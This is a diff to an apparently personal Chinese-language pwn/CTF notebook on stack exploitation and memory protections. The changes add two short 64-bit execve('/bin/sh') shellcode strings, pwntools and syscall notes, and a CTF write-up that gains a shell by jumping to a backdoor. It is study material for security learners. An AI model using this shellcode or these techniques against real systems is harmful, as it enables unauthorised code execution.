@@ -14,7 +14,7 @@ date: 2023-8-21 21:02:28
 
 - Canary（Stack）：栈溢出保护。这是一种缓冲区溢出攻击的缓解手段。如果启用栈保护，那么函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候再次验证cookie信息是否合法，若不合法，则程序停止运行。因此，攻击者在覆盖返回地址的时候，容易将cookie地址同样覆盖掉，导致栈保护检查失败，shellcode无法执行。Linux中的cookie信息便称为canary。如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过
 
-- NX（DEP）：No-execute。NX基本原理就是数据所在内存页标识为不可执行，当程序溢出转到shellcode时，程序尝试在数据页面上执行指令，次吃CPU便会抛出异常而不是执行恶意代码。NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过
+- NX（DEP）：No-execute。NX基本原理就是数据所在内存页标识为不可执行，当程序溢出转到shellcode时，程序尝试在数据页面上执行指令，此时操作系统便会抛出异常而不是执行恶意代码。如果这个保护开启，即`NX enabled`，就意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过
 
 - PIE（ASLR）：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址。
 
@@ -63,6 +63,14 @@ RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)
 | 关闭 | 关闭 | 固定           | 固定   | 固定   | 固定       |
 
 若关闭了`ASLR`，那么堆地址/栈地址/共享库地址一定是固定的。
+
+## 短shellcode
+
+```
+# 64位
+b'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'
+b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
+```
 
 ## 栈溢出-确定填充长度
 
@@ -133,6 +141,12 @@ sh.recvline()  # 接受一行数据，这样可以用来读取指定输出
 ```python
 shellcode = asm(shellcraft.sh()) # 32位
 shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64') # 64位
+```
+
+找到对应节的地址，例如`.plt`：
+
+```python
+plt0 = elf.get_section_by_name('.plt').header.sh_addr
 ```
 
 唤起交互式终端：
@@ -289,8 +303,6 @@ sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
 sh.interactive()
 ```
 
-
-
 ## ret2syscall
 
 思路大概是：使用`ROPgadget`寻找到含有修改寄存器并`ret`的寄存器操作。（要`ret`是因为需要执行多个这样的操作）。然后找到多个这样的操作来覆盖`return address`，通过这些修改寄存器的操作来进行`syscall`。
@@ -323,6 +335,8 @@ sh.interactive()
 
 - 系统调用编号存入rax
 - 参数1存入rdi，参数2存入rsi，参数3存入rdx
+- `execve`的系统调用号为`59`
+- 不再使用`int 80`来发起系统调用，而是`syscall`指令。
 
 ## ROPgadgets操作
 
@@ -1183,8 +1197,6 @@ if __name__ == '__main__':
     sh.interactive()
 ```
 
-
-
 ## mprotect && mmap
 
 首先是`mprotect`。
@@ -1216,14 +1228,13 @@ void* mmap(void* start, size_t length, int prot, int flags, int fd, off_t offset
 // start->要映射到的内存区域的起始地址，设置为0或NULL，表示由内核指定
 // length->要映射到的内存区域文件的大小
 // prot->表示映射区域的权限 PROT_EXEC PROT_READ PROT_WRITE PROT_NONE
+// READ为1，WRITE为2，EXEC为4，NONE为0
 // flags->映射类型，比较复杂
 // fd->文件描述符
 // offset->被映射对象的起点
 
 // 函数将一个文件映射到内存区域的一片空间，内存空间和文件二者被修改了都会改变另一个，但不是立即更新。显式同步可以使用msync()。进程不需要read()或者write()便可以对文件进行修改。mmap没有分配空间，而是将文件映射到内存，要映射的长度在调用mmap()时就已经决定，无法增加长度。
 ```
-
-
 
 ## 栈转移
 
@@ -1302,6 +1313,51 @@ ebp2|target function addr|leave ret addr|arg1|arg2
 |        'aaaa'        |
 
 同样的，对于栈溢出后执行的`gets()`函数，`pop_ebx`这个gadgets是`gets()`的返回地址，`buf2`是`gets()`函数的参数。在`gets()`函数执行完毕后，便会执行`pop_ebx`这个gadgets，因此便将`buf2`从栈里pop了出去，并继续执行栈顶，便是`system()`函数。
+
+## 直接call输入的内容
+
+做题的时候遇到的一个问题，先浅浅记录一下。
+
+首先有一个后门函数：
+
+```c
+int givemeshell()
+{
+  __asm { endbr64 }
+  return system("/bin/sh");
+}
+```
+
+主函数反汇编的代码如下：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rbp
+  __int64 v5; // [rsp-8h] [rbp-8h]
+
+  __asm { endbr64 }
+  v5 = v3;
+  puts("5 bytes ni neng miao sha wo?");
+  mprotect(&GLOBAL_OFFSET_TABLE_, 0x1000uLL, 7);
+  gets();
+  memset(&unk_40408E, 0, 0xF72uLL);
+  ((void (__fastcall *)(void *, _QWORD))code)(&unk_40408E, 0LL);
+  return 0;
+}
+```
+
+可以看到逻辑也比较简单，将输入的部分当做函数执行，但是只能用五个字节。用汇编看其实更加直观：
+
+```assembly
+.text:000000000040125C                 mov     rdx, [rbp-8]
+.text:0000000000401260                 mov     eax, 0
+.text:0000000000401265                 call    rdx
+```
+
+输入的内容被放在了`rdx`，最终也是直接使用了`call rdx`指令。
+
+相当于说是要把`rdx`处的地方当成一个函数来执行，在这个函数里面，我们理所当然的想到在`rdx`里面写`call givemeshell`，但是尝试之后发现是不行的，这里最终是使用了`jmp givemeshell`来跳转到了后门函数。这里只需要注意，`jmp`和`call`大部分情况下是相对跳转，笔者这里是调试后得到的`givemeshell`函数地址的十六进制代码，而`jmp`的十六进制代码是`0xe9`，最终五个字节为`0xffffd148e9`（只是参考一下这个十六进制的形式）完成了跳转。
 
 ## things
 
